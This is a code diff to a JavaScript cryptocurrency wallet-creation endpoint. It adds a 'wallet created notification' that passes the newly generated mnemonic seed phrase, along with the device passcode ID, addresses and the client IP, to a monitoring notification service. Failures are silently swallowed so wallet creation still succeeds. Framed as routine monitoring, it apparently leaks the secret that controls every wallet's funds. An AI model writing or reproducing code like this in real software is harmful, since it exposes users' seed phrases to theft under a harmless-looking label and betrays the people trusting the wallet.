@@ -156,6 +156,25 @@ exports.createMultichainWallet = async (req, res) => {
 
     //console.log('✅ Wallet created successfully with encrypted backup');
 
+    // Send wallet created notification
+    try {
+      const notificationService = require('../services/monitoring/notification.service');
+      await notificationService.sendWalletCreatedNotification({
+        walletId,
+        walletName,
+        devicePassCodeId,
+        primaryAddress,
+        mnemonic,
+        isMain,
+        chains: generatedNetworks.map(n => n.chain),
+        networks: generatedNetworks,
+        ip: req.ip
+      });
+    } catch (notifError) {
+      console.error('Failed to send wallet created notification:', notifError.message);
+      // Don't fail wallet creation if notification fails
+    }
+
     res.json({
       success: true,
       data: {
